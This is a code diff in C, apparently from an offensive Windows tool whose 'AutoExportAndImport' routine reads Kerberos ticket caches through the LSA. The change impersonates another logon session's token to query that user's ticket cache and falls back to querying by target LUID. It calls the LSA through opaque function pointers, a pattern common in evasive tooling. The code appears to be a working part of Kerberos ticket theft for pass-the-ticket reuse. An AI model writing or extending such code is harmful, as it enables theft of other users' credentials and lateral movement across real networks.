@@ -1156,21 +1156,45 @@ void AutoExportAndImport() {
         return;
     }
 
+    HANDLE hImpTokenCache = NULL;
+    BOOL needRevertCache = FALSE;
+
+    if (ImpersonateSession(targetLogonId, &hImpTokenCache)) {
+        if (ImpersonateLoggedOnUser(hImpTokenCache)) {
+            needRevertCache = TRUE;
+        }
+    }
+
     KERB_QUERY_TKT_CACHE_REQUEST cacheReq;
     cacheReq.MessageType = KerbQueryTicketCacheMessage;
-    cacheReq.LogonId.LowPart = targetLuid.LowPart;
-    cacheReq.LogonId.HighPart = targetLuid.HighPart;
+    cacheReq.LogonId.LowPart = 0;
+    cacheReq.LogonId.HighPart = 0;
 
     PKERB_QUERY_TKT_CACHE_RESPONSE cacheRsp = NULL;
     ULONG sz = 0;
     NTSTATUS sub = 0;
 
-    if (cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub) != 0 || sub != 0) {
-        PrintError("Failed to get ticket cache");
-        LsaDeregisterLogonProcess(lsa);
-        fre_fn(session_list);
-        FreeLibrary(h);
-        return;
+    NTSTATUS cacheStatus = cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub);
+
+    if (needRevertCache) {
+        RevertToSelf();
+        CloseHandle(hImpTokenCache);
+    }
+
+    if (cacheStatus != 0 || sub != 0 || !cacheRsp) {
+        if (!cacheRsp) {
+            cacheReq.LogonId.LowPart = targetLuid.LowPart;
+            cacheReq.LogonId.HighPart = targetLuid.HighPart;
+            cacheStatus = cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub);
+        }
+        
+        if (cacheStatus != 0 || sub != 0 || !cacheRsp) {
+            PrintError("Failed to get ticket cache");
+            LsaDeregisterLogonProcess(lsa);
+            fre_fn(session_list);
+            FreeLibrary(h);
+            return;
+        }
     }
 
     BOOL found = FALSE;
